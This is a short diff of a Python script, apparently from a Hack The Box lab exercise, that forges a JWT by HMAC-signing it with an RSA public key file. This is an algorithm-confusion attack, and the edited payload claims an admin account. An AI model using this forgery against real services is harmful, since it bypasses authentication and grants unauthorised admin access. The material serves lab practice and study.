@@ -75,9 +75,9 @@ python3 -c "
 import hmac, hashlib, base64, json
 
 header  = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
-payload = base64.urlsafe_b64encode(json.dumps({'user':'htb-stdnt','isAdmin':True,'exp':1776873353}).encode()).rstrip(b'=')
+payload = base64.urlsafe_b64encode(json.dumps({'user': 'htb-stdnt','accountType': 'admin','id': 1234,'iat': 1776941298}).encode()).rstrip(b'=')
 
-with open('<id>_65537_x509.pem', 'rb') as f:
+with open('d7d7aa36b768a612_65537_x509.pem', 'rb') as f:
     key = f.read()
 
 msg = header + b'.' + payload
